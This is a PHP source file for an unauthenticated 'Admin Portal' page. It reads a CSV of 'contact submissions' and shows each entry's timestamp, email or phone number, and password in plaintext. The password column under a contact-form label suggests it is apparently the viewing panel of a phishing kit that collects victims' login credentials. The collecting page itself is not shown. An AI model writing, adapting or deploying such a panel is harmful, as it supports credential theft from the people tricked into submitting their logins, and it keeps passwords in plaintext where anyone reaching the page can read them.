<?php
$dataFile = 'submissions.csv';
$rows = [];

if (file_exists($dataFile)) {
    if (($handle = fopen($dataFile, "r")) !== FALSE) {
        // Read header
        $header = fgetcsv($handle);
        while (($data = fgetcsv($handle)) !== FALSE) {
            $rows[] = $data;
        }
        fclose($handle);
    }
}
// Reverse rows so newest entries show up first
$rows = array_reverse($rows);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Portal - Submissions</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 40px;
        }
        .admin-container {
            max-width: 900px;
            margin: 0 auto;
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }
        h2 {
            margin-bottom: 20px;
            color: #333333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        th {
            background-color: #0067ff;
            color: #ffffff;
            font-weight: 600;
        }
        tr:hover {
            background-color: #f9f9f9;
        }
        .no-data {
            text-align: center;
            padding: 30px;
            color: #777777;
        }
    </style>
</head>
<body>

<div class="admin-container">
    <h2>Admin Portal - Contact Submissions</h2>
    
    <?php if (empty($rows)): ?>
        <div class="no-data">No contact entries recorded yet.</div>
    <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Email or Phone Number</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($rows as $row): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($row[0] ?? ''); ?></td>
                        <td><?php echo htmlspecialchars($row[1] ?? ''); ?></td>
                        <td><?php echo htmlspecialchars($row[2] ?? ''); ?></td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    <?php endif; ?>
</div>

</body>
</html>
